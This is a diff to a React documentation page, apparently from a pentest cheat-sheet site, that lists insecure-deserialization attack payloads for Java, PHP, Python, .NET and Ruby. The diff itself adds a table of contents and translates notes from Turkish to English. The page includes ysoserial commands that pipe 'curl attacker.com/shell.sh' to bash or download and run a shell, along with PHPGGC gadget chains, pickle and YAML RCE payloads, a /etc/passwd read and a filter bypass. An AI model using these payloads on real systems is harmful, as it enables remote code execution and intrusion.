@@ -5,12 +5,24 @@ import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
 import Link from "next/link"
 import { PayloadList } from "@/components/docs/payload-list"
 import { Callout } from "@/components/docs/callout"
+import { TableOfContents } from "@/components/docs/table-of-contents"
+
+const tocItems = [
+  { id: "java", title: "Java Deserialization", level: 2 },
+  { id: "java-magic", title: "Java Magic Bytes", level: 2 },
+  { id: "php", title: "PHP Deserialization", level: 2 },
+  { id: "python", title: "Python Deserialization", level: 2 },
+  { id: "dotnet", title: ".NET Deserialization", level: 2 },
+  { id: "ruby", title: "Ruby Deserialization", level: 2 },
+]
 
 const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
 const stagger = { visible: { transition: { staggerChildren: 0.05 } } }
 
 export default function DeserializationPage() {
   return (
+    <>
+    <TableOfContents items={tocItems} />
     <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
       <motion.div variants={fadeIn} className="mb-8">
         <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
@@ -30,7 +42,7 @@ export default function DeserializationPage() {
       </Callout>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Java Deserialization</h2>
+        <h2 id="java" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Java Deserialization</h2>
         <p className="text-muted-foreground mb-4">
           Java ObjectInputStream kullanan uygulamalar hedef alınır. ysoserial aracı ile
           gadget chain&apos;ler oluşturulur.
@@ -41,21 +53,21 @@ export default function DeserializationPage() {
           payloads={[
             { code: `java -jar ysoserial.jar CommonsCollections1 'id' | base64`, note: "Apache Commons Collections 3.1" },
             { code: `java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh|bash'`, note: "CC5 - reverse shell" },
-            { code: `java -jar ysoserial.jar CommonsCollections6 'wget attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell'`, note: "CC6 zinciri" },
-            { code: `java -jar ysoserial.jar CommonsCollections7 'ping -c 3 attacker.com'`, note: "CC7 - OOB tespit" },
-            { code: `java -jar ysoserial.jar CommonsCollections10 'id'`, note: "CC10 - yeni versiyonlar" },
-            { code: `java -jar ysoserial.jar CommonsCollections13 'id'`, note: "CC13 - son zincirler" },
+            { code: `java -jar ysoserial.jar CommonsCollections6 'wget attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell'`, note: "CC6 chain" },
+            { code: `java -jar ysoserial.jar CommonsCollections7 'ping -c 3 attacker.com'`, note: "CC7 - OOB detection" },
+            { code: `java -jar ysoserial.jar CommonsCollections10 'id'`, note: "CC10 - newer versions" },
+            { code: `java -jar ysoserial.jar CommonsCollections13 'id'`, note: "CC13 - latest chains" },
             { code: `java -jar ysoserial.jar Spring1 'touch /tmp/pwned'`, note: "Spring Framework gadget" },
             { code: `java -jar ysoserial.jar Hibernate1 'id'`, note: "Hibernate ORM gadget" },
             { code: `java -jar ysoserial.jar JBossInterceptors1 'id'`, note: "JBoss gadget" },
             { code: `java -jar ysoserial.jar Jdk7u21 'id'`, note: "JDK 7u21 native gadget" },
-            { code: `java -jar ysoserial.jar URLDNS http://attacker.burpcollaborator.net`, note: "DNS lookup - sadece tespit" },
+            { code: `java -jar ysoserial.jar URLDNS http://attacker.burpcollaborator.net`, note: "DNS lookup - detection only" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Java Magic Bytes</h2>
+        <h2 id="java-magic" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Java Magic Bytes</h2>
         <Callout type="info" title="Tespit">
           Java serialized object&apos;ler &quot;ac ed 00 05&quot; (hex) veya &quot;rO0AB&quot; (base64) ile başlar.
           HTTP request/response&apos;larda bu pattern&apos;leri arayın.
@@ -64,18 +76,18 @@ export default function DeserializationPage() {
           title="Detection Patterns"
           initialShow={6}
           payloads={[
-            { code: `ac ed 00 05`, note: "Java serialized object hex imzası" },
-            { code: `rO0AB`, note: "Base64 kodlanmış Java nesnesi" },
+            { code: `ac ed 00 05`, note: "Java serialized object hex signature" },
+            { code: `rO0AB`, note: "Base64 encoded Java object" },
             { code: `Content-Type: application/x-java-serialized-object`, note: "Java serialization content type" },
-            { code: `H4sIAAAA`, note: "Base64 gzip Java nesnesi" },
-            { code: `.class dosyalarında ObjectInputStream.readObject()`, note: "Kaynak kod incelemesi" },
+            { code: `H4sIAAAA`, note: "Base64 gzip Java object" },
+            { code: `.class dosyalarında ObjectInputStream.readObject()`, note: "Source code review" },
             { code: `XMLDecoder, XStream, Kryo, Hessian`, note: "Alternatif serialization kütüphaneleri" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">PHP Deserialization</h2>
+        <h2 id="php" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">PHP Deserialization</h2>
         <p className="text-muted-foreground mb-4">
           PHP&apos;de unserialize() fonksiyonu ile magic method&apos;lar (__wakeup, __destruct, __toString)
           tetiklenerek RCE elde edilir.
@@ -84,64 +96,64 @@ export default function DeserializationPage() {
           title="PHP Object Injection"
           initialShow={8}
           payloads={[
-            { code: `O:8:"stdClass":1:{s:4:"test";s:4:"data";}`, note: "Temel PHP serialized nesne" },
-            { code: `O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/etc/passwd";}`, note: "Deserialization ile dosya okuma" },
-            { code: `O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}`, note: "Yetki yükseltme" },
-            { code: `a:2:{i:0;s:4:"test";i:1;O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}`, note: "İç içe nesne içeren dizi" },
-            { code: `O:+4:"User":1:{s:4:"role";s:5:"admin";}`, note: "+ ile sınıf adı filtre bypass" },
-            { code: `O:4:"User":1:{S:4:"\\72ole";s:5:"admin";}`, note: "Hex kodlanmış özellik adı" },
-            { code: `C:11:"ArrayObject":37:{x:i:0;a:1:{s:4:"role";s:5:"admin";};m:a:0:{}}`, note: "Özel serializable sınıf" },
-            { code: `phpggc Laravel/RCE1 system id`, note: "PHPGGC - Laravel gadget zinciri" },
+            { code: `O:8:"stdClass":1:{s:4:"test";s:4:"data";}`, note: "Basic PHP serialized object" },
+            { code: `O:14:"DatabaseExport":1:{s:8:"filename";s:11:"/etc/passwd";}`, note: "File read via deserialization" },
+            { code: `O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}`, note: "Privilege escalation" },
+            { code: `a:2:{i:0;s:4:"test";i:1;O:4:"Evil":1:{s:3:"cmd";s:2:"id";}}`, note: "Array with nested object" },
+            { code: `O:+4:"User":1:{s:4:"role";s:5:"admin";}`, note: "+ bypass for class name filter" },
+            { code: `O:4:"User":1:{S:4:"\\72ole";s:5:"admin";}`, note: "Hex encoded property name" },
+            { code: `C:11:"ArrayObject":37:{x:i:0;a:1:{s:4:"role";s:5:"admin";};m:a:0:{}}`, note: "Custom serializable" },
+            { code: `phpggc Laravel/RCE1 system id`, note: "PHPGGC - Laravel gadget chain" },
             { code: `phpggc Symfony/RCE4 exec 'id'`, note: "PHPGGC - Symfony gadget" },
             { code: `phpggc WordPress/RCE2 system id`, note: "PHPGGC - WordPress gadget" },
             { code: `phpggc Magento/SQLI1 'SELECT version()'`, note: "PHPGGC - Magento SQL injection" },
-            { code: `phar://malicious.phar`, note: "Phar deserialization - dosya işlemleri unserialize tetikler" },
+            { code: `phar://malicious.phar`, note: "Phar deserialization - file ops trigger unserialize" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Python Deserialization</h2>
+        <h2 id="python" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Python Deserialization</h2>
         <PayloadList
           title="Pickle / PyYAML Payloads"
           initialShow={6}
           payloads={[
-            { code: `import pickle, os; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`, note: "Temel pickle RCE" },
-            { code: `import yaml; yaml.load("!!python/object/apply:os.system ['id']")`, note: "PyYAML güvensiz yükleme" },
-            { code: `import yaml; yaml.load("!!python/object/new:subprocess.check_output [['id']]")`, note: "PyYAML subprocess çalıştırma" },
+            { code: `import pickle, os; pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")`, note: "Basic pickle RCE" },
+            { code: `import yaml; yaml.load("!!python/object/apply:os.system ['id']")`, note: "PyYAML unsafe load" },
+            { code: `import yaml; yaml.load("!!python/object/new:subprocess.check_output [['id']]")`, note: "PyYAML subprocess" },
             { code: `gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==`, note: "Base64 pickle payload" },
-            { code: `\\x80\\x04\\x95...`, note: "Ham pickle byte'ları - protokol 4" },
+            { code: `\\x80\\x04\\x95...`, note: "Raw pickle bytes - protocol 4" },
             { code: `import jsonpickle; jsonpickle.decode('{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}')`, note: "jsonpickle RCE" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">.NET Deserialization</h2>
+        <h2 id="dotnet" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">.NET Deserialization</h2>
         <PayloadList
           title=".NET Gadget Chains"
           initialShow={6}
           payloads={[
-            { code: `ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"`, note: "TypeConfuseDelegate zinciri" },
+            { code: `ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc"`, note: "TypeConfuseDelegate chain" },
             { code: `ysoserial.net -g WindowsIdentity -f Json.Net -c "calc"`, note: "Json.NET deserialization" },
-            { code: `ysoserial.net -g PSObject -f BinaryFormatter -c "calc"`, note: "BinaryFormatter zinciri" },
-            { code: `ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c ping attacker.com"`, note: "OOB tespit" },
-            { code: `ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami"`, note: "Activity zinciri" },
-            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}`, note: "Json.NET TypeNameHandling istismarı" },
+            { code: `ysoserial.net -g PSObject -f BinaryFormatter -c "calc"`, note: "BinaryFormatter chain" },
+            { code: `ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c ping attacker.com"`, note: "OOB detection" },
+            { code: `ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c whoami"`, note: "Activity chain" },
+            { code: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c calc"}}}`, note: "Json.NET TypeNameHandling exploit" },
           ]}
         />
       </motion.section>
 
       <motion.section variants={fadeIn} className="mt-12">
-        <h2 className="text-2xl font-semibold text-foreground mb-4">Ruby Deserialization</h2>
+        <h2 id="ruby" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Ruby Deserialization</h2>
         <PayloadList
           title="Ruby Marshal Payloads"
           initialShow={4}
           payloads={[
-            { code: `Marshal.dump(ERB.new("<%= system('id') %>"))`, note: "Marshal ile ERB template injection" },
+            { code: `Marshal.dump(ERB.new("<%= system('id') %>"))`, note: "ERB template injection via Marshal" },
             { code: `Gem::Installer.new.spec.tap{|s| s.name="a"; s.version="0"; s.platform="ruby"; s.authors=["a"]; s.summary="a"; s.instance_variable_set(:@loaded_from,"|id")}`, note: "Gem::Installer gadget" },
-            { code: `YAML.load("--- !ruby/object:Gem::Requirement\\nrequirements:\\n- !ruby/object:Gem::DependencyList\\n  specs:\\n  - !ruby/object:Gem::Source\\n    uri: |\\n      id")`, note: "YAML güvensiz yükleme" },
-            { code: `\\x04\\x08...`, note: "Ham Marshal byte'ları" },
+            { code: `YAML.load("--- !ruby/object:Gem::Requirement\\nrequirements:\\n- !ruby/object:Gem::DependencyList\\n  specs:\\n  - !ruby/object:Gem::Source\\n    uri: |\\n      id")`, note: "YAML unsafe load" },
+            { code: `\\x04\\x08...`, note: "Raw Marshal bytes" },
           ]}
         />
       </motion.section>
@@ -165,5 +177,6 @@ export default function DeserializationPage() {
         </Link>
       </motion.div>
     </motion.div>
+    </>
   )
 }
